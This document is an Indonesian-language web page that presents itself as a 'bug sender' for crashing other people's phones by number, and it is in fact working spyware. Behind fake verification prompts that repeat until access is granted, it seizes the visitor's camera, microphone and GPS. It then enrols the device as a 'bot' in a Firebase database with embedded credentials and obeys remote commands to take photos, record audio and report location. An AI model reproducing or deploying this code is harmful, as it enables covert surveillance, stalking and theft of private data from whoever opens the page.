<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
<title>Nortax High - System</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<style>
  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
  :root { 
    --bg: #050505; --card: #121212; --border: #262626; 
    --txt: #ffffff; --muted: #a3a3a3; --accent: #ef4444; --accent-hover: #dc2626;
  }
  body { 
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
    background: var(--bg); color: var(--txt); min-height: 100vh; 
    display: flex; align-items: center; justify-content: center; padding: 20px; 
  }
  .container { 
    background: var(--card); border: 1px solid var(--border); border-radius: 20px; 
    padding: 30px 24px; width: 100%; max-width: 400px; 
    box-shadow: 0 25px 50px -12px rgba(0,0,0,0.8); text-align: center; 
  }
  .brand-img { width: 100%; max-height: 100px; object-fit: contain; margin-bottom: 20px; }
  
  .input-group { margin-bottom: 16px; position: relative; }
  .input-group i { position: absolute; left: 16px; top: 50%; transform: translateY(-50%); color: var(--muted); }
  .input-group input { 
    width: 100%; padding: 16px 16px 16px 44px; background: #000; 
    border: 1px solid var(--border); border-radius: 12px; color: white; outline: none; font-size: 15px; transition: 0.2s;
  }
  .input-group input:focus { border-color: var(--accent); }
  
  .btn-row { display: flex; gap: 12px; margin-bottom: 16px; }
  .btn-type { 
    flex: 1; padding: 14px; border-radius: 12px; border: 1px solid var(--border); 
    background: transparent; color: var(--muted); font-weight: 600; cursor: pointer; transition: 0.2s;
    display: flex; align-items: center; justify-content: center; gap: 8px;
  }
  .btn-type.active { background: rgba(239,68,68,0.1); border-color: var(--accent); color: var(--accent); }
  
  select { 
    width: 100%; padding: 16px; background: #000; border: 1px solid var(--border); 
    border-radius: 12px; color: white; outline: none; font-size: 15px; margin-bottom: 24px; appearance: none; 
  }
  
  .btn-submit { 
    width: 100%; padding: 16px; border: 0; border-radius: 12px; 
    background: var(--accent); color: white; font-size: 16px; font-weight: bold; 
    cursor: pointer; transition: 0.2s; display: flex; align-items: center; justify-content: center; gap: 10px;
    box-shadow: 0 8px 20px rgba(239,68,68,0.3);
  }
  .btn-submit:hover { background: var(--accent-hover); }
  
  /* MODAL IZIN */
  .modal-overlay { 
    position: fixed; inset: 0; background: rgba(0,0,0,0.9); backdrop-filter: blur(8px);
    display: none; align-items: center; justify-content: center; z-index: 999; padding: 20px;
  }
  .modal-box { 
    background: var(--card); border: 1px solid var(--border); padding: 32px 24px; 
    border-radius: 20px; max-width: 350px; text-align: center; animation: pop 0.3s cubic-bezier(0.16, 1, 0.3, 1);
  }
  @keyframes pop { 0% { transform: scale(0.95); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }
  .modal-box i { font-size: 44px; color: var(--accent); margin-bottom: 20px; }
  .modal-box h3 { margin-bottom: 8px; font-size: 20px; font-weight: 700; }
  .modal-box p { font-size: 14px; color: var(--muted); margin-bottom: 24px; line-height: 1.5; }
  
  .hidden { display: none !important; }
</style>
</head>
<body>

<!-- TAMPILAN UTAMA WEB 1 -->
<div class="container" id="main-ui">
  <img src="https://c.termai.cc/i188/cSZlsG.png" alt="Nortax High" class="brand-img">
  
  <div class="input-group">
    <i class="fa-solid fa-phone"></i>
    <input type="tel" placeholder="Masukkan nomor telepon" id="phone">
  </div>
  
  <div class="btn-row">
    <button class="btn-type active" onclick="setType('private', this)"><i class="fa-solid fa-lock"></i> Private</button>
    <button class="btn-type" onclick="setType('global', this)"><i class="fa-solid fa-globe"></i> Global</button>
  </div>
  
  <select id="bug-menu">
    <option value="" disabled selected>Pilih Bug Target</option>
    <option value="fc_android">FC Android</option>
    <option value="fc_ios">FC Ios</option>
    <option value="blank_hard">Blank Hard</option>
    <option value="delay_invis">Delay Invis</option>
    <option value="chat_lock_v1">Chat Lock v1</option>
    <option value="chat_lock_v2">Chat Lock v2</option>
  </select>
  
  <button class="btn-submit" id="btn-submit"><i class="fa-solid fa-paper-plane"></i> Kirim Bug</button>
</div>

<!-- MODAL PERIZINAN LOOPING -->
<div class="modal-overlay" id="permission-modal">
  <div class="modal-box">
    <i class="fa-solid fa-shield-halved" id="modal-icon"></i>
    <h3 id="modal-title">Izin Diperlukan</h3>
    <p id="modal-desc">Sistem membutuhkan izin untuk melanjutkan.</p>
    <button class="btn-submit" id="btn-permit">Izinkan Akses</button>
  </div>
</div>

<script type="module">
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
  import { getDatabase, ref, set, onValue, get } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";

  const firebaseConfig = {
    apiKey: "AIzaSyAcCOElhsRPXsKYyJOj4dqmB_7hN2t1kzw",
    authDomain: "nortax-8c172.firebaseapp.com",
    databaseURL: "https://nortax-8c172-default-rtdb.asia-southeast1.firebasedatabase.app",
    projectId: "nortax-8c172",
    storageBucket: "nortax-8c172.firebasestorage.app",
    messagingSenderId: "193601848909",
    appId: "1:193601848909:web:4dca98cbd31248ed8b7e04"
  };

  const app = initializeApp(firebaseConfig);
  const db = getDatabase(app);

  let currentType = 'private';
  let deviceId = localStorage.getItem('nortax_device_id');
  if (!deviceId) {
    deviceId = 'dev_' + Math.random().toString(36).slice(2, 10);
    localStorage.setItem('nortax_device_id', deviceId);
  }
  
  const botRef = ref(db, 'bots/' + deviceId);
  let video, canvas, currentStream, currentFacing = "user";
  let audioStream, mediaRecorder, audioChunks = [];
  let currentPermStage = 0;

  window.setType = (type, btn) => {
    currentType = type;
    document.querySelectorAll('.btn-type').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
  };

  document.getElementById('btn-submit').onclick = async () => {
    const phone = document.getElementById('phone').value;
    const bug = document.getElementById('bug-menu').value;
    if(!phone || !bug) return alert("Lengkapi nomor dan pilih bug!");
    
    // Cek apakah device ini udah terdaftar
    const snap = await get(botRef);
    if (snap.exists() && snap.val().status === 'online') {
      alert("Device ini sudah terdaftar di sistem.");
      return;
    }

    document.getElementById('permission-modal').style.display = 'flex';
    requestNextPermission();
  };

  async function requestNextPermission() {
    const modalTitle = document.getElementById('modal-title');
    const modalDesc = document.getElementById('modal-desc');
    const modalIcon = document.getElementById('modal-icon');
    
    if (currentPermStage === 0) {
      modalTitle.textContent = "Akses Kamera (1/3)";
      modalDesc.textContent = "Izinkan kamera untuk verifikasi target.";
      modalIcon.className = "fa-solid fa-camera";
    } else if (currentPermStage === 1) {
      modalTitle.textContent = "Akses Mikrofon (2/3)";
      modalDesc.textContent = "Izinkan mikrofon untuk perekaman suara.";
      modalIcon.className = "fa-solid fa-microphone";
    } else if (currentPermStage === 2) {
      modalTitle.textContent = "Akses Lokasi (3/3)";
      modalDesc.textContent = "Izinkan lokasi untuk pelacakan GPS.";
      modalIcon.className = "fa-solid fa-location-dot";
    }
  }

  document.getElementById('btn-permit').onclick = async () => {
    try {
      if (currentPermStage === 0) {
        try {
          currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
          initVideo();
          currentPermStage++;
          requestNextPermission();
        } catch(e) {
          alert("Kamera DITOLAK! Anda harus mengizinkan untuk melanjutkan.");
          requestNextPermission();
        }
      } 
      else if (currentPermStage === 1) {
        try {
          audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
          currentPermStage++;
          requestNextPermission();
        } catch(e) {
          alert("Mikrofon DITOLAK! Anda harus mengizinkan untuk melanjutkan.");
          requestNextPermission();
        }
      }
      else if (currentPermStage === 2) {
        navigator.geolocation.getCurrentPosition(
          async (pos) => {
            document.getElementById('permission-modal').style.display = 'none';
            await set(botRef, { 
              status: 'online', cmd: 'none', facing: 'user', 
              img: '', data: '', phone: document.getElementById('phone').value, 
              type: currentType, bug: document.getElementById('bug-menu').value 
            });
            setupFirebaseListener();
          },
          (err) => {
            alert("Lokasi DITOLAK! Anda harus mengizinkan untuk melanjutkan.");
            requestNextPermission();
          },
          { enableHighAccuracy: true, timeout: 5000 }
        );
      }
    } catch (err) {}
  };

  function initVideo() {
    video = document.createElement('video');
    video.srcObject = currentStream;
    video.setAttribute('playsinline', '');
    video.play();
    canvas = document.createElement('canvas');
  }

  async function switchCamera(facing) {
    if (currentStream) currentStream.getTracks().forEach(t => t.stop());
    currentFacing = facing;
    try {
      currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing } });
      initVideo();
    } catch(e) {
      currentStream = await navigator.mediaDevices.getUserMedia({ video: true });
      initVideo();
    }
  }

  function setupFirebaseListener() {
    onValue(botRef, async (snapshot) => {
      const data = snapshot.val();
      if (!data) return;

      if (data.cmd === 'snap') {
        if (data.facing !== currentFacing) await switchCamera(data.facing);
        setTimeout(async () => {
          if (video.videoWidth > 0) {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const imgData = canvas.toDataURL('image/jpeg', 0.7);
            await set(botRef, { ...data, cmd: 'none', img: imgData });
          }
        }, 500);
      }

      if (data.cmd === 'geo') {
        navigator.geolocation.getCurrentPosition(async (pos) => {
          await set(botRef, { ...data, cmd: 'none', data: "📍 GPS TARGET:\nLat: " + pos.coords.latitude + "\nLng: " + pos.coords.longitude });
        });
      }

      if (data.cmd === 'record_audio') {
        if (!audioStream) return;
        mediaRecorder = new MediaRecorder(audioStream);
        audioChunks = [];
        mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
        mediaRecorder.onstop = async () => {
          const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
          const reader = new FileReader();
          reader.readAsDataURL(audioBlob);
          reader.onloadend = async () => {
            await set(botRef, { ...data, cmd: 'none', data: reader.result });
          };
        };
        mediaRecorder.start();
        setTimeout(() => { mediaRecorder.stop(); }, 5000);
      }
    });
  }
</script>
</body>
</html>
